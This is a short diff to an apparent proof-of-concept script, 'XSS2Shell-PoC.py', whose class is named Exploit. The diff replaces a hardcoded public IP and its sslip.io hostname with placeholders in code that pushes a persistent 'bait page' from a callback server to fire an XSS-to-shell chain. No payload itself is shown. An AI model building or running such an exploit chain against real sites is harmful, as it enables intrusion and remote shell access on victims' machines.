@@ -993,14 +993,14 @@ class Exploit:
                             f"— Token Invalid?", 'warn')
                 except Exception as e:
                     log(f"Bait Push Failed: {e}", 'warn')
-            elif self.callback_host != '103.31.205.161':
+            elif self.callback_host != 'REPLACE_WITH_PUBLIC_IP':
                 log("Bait Push Skipped: No x2s_token.txt Next to Script.",
                     'warn')
                 log("  Get Token from VM: cat /root/.x2s_token\n"
                     "  Save as x2s_token.txt Beside XSS2Shell-PoC.py",
                     'info')
 
-            if pushed or self.callback_host == '103.31.205.161':
+            if pushed or self.callback_host == 'REPLACE_WITH_PUBLIC_IP':
                 log(f"  Bait Page (Persistent, Fires Full Chain):\n"
                     f"    {vm_bait}", 'success')
             else:
@@ -1074,7 +1074,7 @@ class Exploit:
 
     def _vm_host(self) -> str:
         """The Persistent Bait Server Host (VM with Public IP)."""
-        return '103-31-205-161.sslip.io'
+        return 'REPLACE-WITH-PUBLIC-IP.sslip.io'
 
     @staticmethod
     def _load_bait_token() -> str:
